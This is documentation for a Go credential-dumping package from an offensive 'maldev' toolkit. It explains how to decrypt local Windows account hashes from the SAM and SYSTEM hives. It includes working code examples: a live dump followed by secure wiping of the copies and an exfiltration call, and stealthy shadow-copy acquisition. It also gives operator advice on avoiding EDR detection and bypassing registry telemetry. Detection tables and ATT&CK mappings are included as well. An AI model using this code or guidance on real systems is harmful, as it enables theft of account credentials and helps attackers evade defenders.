---
package: github.com/oioio-space/maldev/credentials/samdump
last_reviewed: 2026-04-27
reflects_commit: cfd7730
---

# SAM hive dump

[← credentials index](README.md) · [docs/index](../../index.md)

## TL;DR

Decrypt local NT hashes from a Windows `SAM` hive (with `SYSTEM`
supplying the boot key). Pure-Go REGF parser + AES/RC4/DES crypto;
runs cross-platform once the operator has the hive bytes in hand.
LiveDump shells out to `reg save` for live acquisition (Windows-only,
loud on EDR).

## Primer

Local Windows accounts live in the `SAM` registry hive under
`SAM\Domains\Account`. Each user's NT/LM hash is stored encrypted —
two layers of crypto stand between the on-disk bytes and a usable
hash:

1. The **boot key** (syskey) is split across four `Lsa\{JD,Skew1,GBG,Data}`
   class strings in the `SYSTEM` hive, permuted at boot to defeat
   trivial copies. Reassembling it requires the SYSTEM hive.
2. The boot key encrypts the **hashed bootkey** stored in
   `SAM\Domains\Account\F` — itself an AES-128-CBC blob keyed on
   `MD5(bootKey || rid_str || qwerty || rid_str)` (legacy revision
   uses RC4).
3. The hashed bootkey then derives per-user keys (RC4 or AES-128-CBC
   depending on the revision tag in `F`). Per-user keys decrypt the
   16-byte LM and NT hash blobs in `SAM\Domains\Account\Users\<RID>\V`.
4. Modern Windows (10 1607+) also wraps the hashes in a final DES
   permutation keyed on the RID — same algorithm Windows itself
   uses to look up the hash at logon.

`samdump.Dump` runs the entire chain in process memory with no
syscalls. The hive bytes can come from anywhere — `reg save`, VSS
shadow copy, raw NTFS read, recon/shadowcopy, or pulled offline
from a backup. The package itself opens nothing.

## How It Works

```mermaid
flowchart TD
    SYS[SYSTEM hive bytes] --> EBK[extractBootKey<br/>permute Lsa class strings]
    EBK -->|16-byte boot key| HBK
    SAM[SAM hive bytes] --> RDF[readDomainAccountF<br/>AES-encrypted blob]
    RDF --> HBK[deriveDomainKey<br/>AES-128-CBC]
    HBK -->|hashed bootkey| LU
    SAM --> LU[listUserRIDs<br/>walk Users key]
    LU --> PV[parseUserV<br/>extract username + LM/NT enc]
    PV --> DEC[decryptUserNT / decryptUserLM<br/>per-RID DES-permute<br/>+ AES-128-CBC or RC4]
    DEC --> ACC[Account&#123;Username, RID, NT, LM&#125;]
```

Implementation details:

- The REGF reader (`hive.go`) walks named keys and value records
  through `nk` / `vk` cells without depending on `golang.org/x/sys`
  or any Windows-only API — cross-platform out of the box.
- Per-user failures are accumulated on `Result.Warnings` rather
  than aborting the dump; structural failures (missing boot key,
  malformed `F`, no `Users` key) return `ErrDump`.
- `Account.Pwdump` renders the canonical `username:RID:LM:NT:::`
  format consumed by hashcat (`-m 1000`), John (`--format=NT`),
  CrackMapExec NTLM hash auth, and impacket secretsdump.

## API Reference

### `type Account`

[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/credentials/samdump#Account)

One decrypted user record.

| Field | Type | Description |
|---|---|---|
| `Username` | `string` | UTF-16 decoded sAMAccountName |
| `RID` | `uint32` | Relative identifier (numeric SID component) |
| `LM` | `[]byte` | 16-byte LM hash, or nil when inactive |
| `NT` | `[]byte` | 16-byte NT (MD4) hash, or nil when inactive |

`Account.Pwdump()` formats one secretsdump line. Empty hashes
render as the all-zeros sentinel.

### `type Result`

[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/credentials/samdump#Result)

Aggregate output of a successful dump.

| Field | Type | Description |
|---|---|---|
| `Accounts` | `[]Account` | One entry per user RID |
| `Warnings` | `[]string` | Non-fatal per-user anomalies (parse / decrypt failures, missing optional fields) |

`Result.Pwdump()` renders the multi-line pwdump file.

### `Dump(systemHive, systemSize, samHive, samSize) (Result, error)`

[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/credentials/samdump#Dump)

Run the full offline algorithm. Both readers must support `ReadAt`
over the entire hive bytes; `Dump` loads each into memory once. No
syscalls, cross-platform.

**Returns:** `Result` with per-user accounts; `error` wrapping
`ErrDump` on structural failure.

### `LiveDump(dir string) (Result, string, string, error)` (Windows)

[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/credentials/samdump#LiveDump)

Acquire the live `SYSTEM` + `SAM` hives via `reg save` to `dir`,
then run `Dump` against them. Returns the `Result` plus the on-disk
paths (`system.hive`, `sam.hive`) so the operator can re-feed
the files to other tooling without re-acquiring.

**Side effects:** spawns `reg.exe`; writes hive files to disk.
Requires admin + `SeBackupPrivilege`.

**Returns:** `error` wrapping `ErrLiveDump` if `reg save` or the
underlying `Dump` fails.

## Examples

### Simple — offline hives

```go
import (
    "fmt"
    "os"

    "github.com/oioio-space/maldev/credentials/samdump"
)

system, _ := os.Open(`/loot/SYSTEM`)
defer system.Close()
sam, _ := os.Open(`/loot/SAM`)
defer sam.Close()

sysFI, _ := system.Stat()
samFI, _ := sam.Stat()

res, err := samdump.Dump(system, sysFI.Size(), sam, samFI.Size())
if err != nil {
    panic(err)
}
fmt.Print(res.Pwdump())
```

### Composed — live host, cleanup, exfil

```go
import (
    "os"

    "github.com/oioio-space/maldev/credentials/samdump"
    "github.com/oioio-space/maldev/cleanup/wipe"
)

dir, _ := os.MkdirTemp("", "")
res, sysPath, samPath, err := samdump.LiveDump(dir)
defer func() {
    _ = wipe.File(sysPath)
    _ = wipe.File(samPath)
    _ = os.RemoveAll(dir)
}()
if err != nil {
    panic(err)
}
exfilPwdump(res.Pwdump())
```

### Advanced — VSS shadow-copy acquisition

`reg save` is loud. For better OPSEC, acquire the hives via VSS
shadow copies through [`recon/shadowcopy`](../recon/) and feed the
files into the offline `Dump` path:

```go
sc, _ := shadowcopy.Create()
defer sc.Delete()

sysReader, _ := sc.Open(`Windows\System32\config\SYSTEM`)
samReader, _ := sc.Open(`Windows\System32\config\SAM`)

res, err := samdump.Dump(sysReader, sysReader.Size(),
    samReader, samReader.Size())
```

See [`ExampleDump`](../../../credentials/samdump/samdump_example_test.go)
for the runnable variant.

## OPSEC & Detection

| Artefact | Where defenders look |
|---|---|
| `reg save HKLM\SAM` / `HKLM\SYSTEM` | Sysmon Event 1 (process creation) — `reg.exe` with `save` is one of the highest-fidelity credential-dumping signals |
| Two `.hive` files written to a writable directory | EDR file-write telemetry; staging directories under `%TEMP%` are correlated with credential dumping |
| `RegSaveKeyEx` Windows API call | ETW Microsoft-Windows-Kernel-Registry; bypassable via direct `NtSaveKey` syscall |
| Read access to `HKLM\SAM` SD | Defender ASR rule `"Block credential stealing from the Windows local security authority subsystem"` (LSA-only, but heuristics overlap) |

**D3FEND counters:**

- [D3-PSA](https://d3fend.mitre.org/technique/d3f:ProcessSpawnAnalysis/)
  — flags `reg.exe save` lineage.
- [D3-FCA](https://d3fend.mitre.org/technique/d3f:FileContentAnalysis/)
  — REGF magic on disk in atypical paths.
- [D3-SICA](https://d3fend.mitre.org/technique/d3f:SystemConfigurationDatabaseAnalysis/)
  — registry hive-handle telemetry.

**Hardening for the operator:**

- Prefer offline acquisition (VSS via `recon/shadowcopy`, raw NTFS
  read, backup files) over `LiveDump`.
- Stage hive bytes through an in-memory `io.ReaderAt` (e.g.
  `bytes.NewReader`) to avoid the `.hive` files on disk altogether.
- Wipe the `dir` immediately after parsing — `cleanup/wipe.File`
  zeroes the bytes before unlinking.

## MITRE ATT&CK

| T-ID | Name | Sub-coverage | D3FEND counter |
|---|---|---|---|
| [T1003.002](https://attack.mitre.org/techniques/T1003/002/) | OS Credential Dumping: Security Account Manager | full — offline + LiveDump | D3-PSA, D3-FCA, D3-SICA |

## Limitations

- **Local accounts only.** SAM holds only the workstation's local
  users. Domain credentials live in `NTDS.dit` on the DC; use
  separate tooling (impacket secretsdump remote, mimikatz `lsadump::dcsync`).
- **No history.** Earlier NT/LM hashes (password-history feature)
  are stored in additional `V` regions not currently parsed.
- **DPAPI / cached creds out of scope.** Domain cached credentials
  (`Cache{N}`) live in `SECURITY` hive; `SECURITY` parsing is not
  in this package.
- **LiveDump is loud.** `reg.exe save` lights up every behavioral
  EDR. Plan for offline acquisition wherever the operational
  context allows.
- **AES revision only validated against Win10 1607+.** Older XP/2003
  RC4-keyed hives use the legacy code path; tested less recently.

## See also

- [LSASS dump (live process memory)](../collection/lsass-dump.md) —
  cousin path for live cached credentials.
- [`credentials/sekurlsa`](sekurlsa.md) — companion LSASS extractor.
- [`recon/shadowcopy`](../recon/) — VSS-based hive acquisition.
- [`cleanup/wipe`](../cleanup/) — secure deletion of the on-disk
  hive copies.
- [Operator path](../../by-role/operator.md) — credential-harvest
  decision tree.
- [Detection eng path](../../by-role/detection-eng.md#credential-access)
  — SAM-dump telemetry.
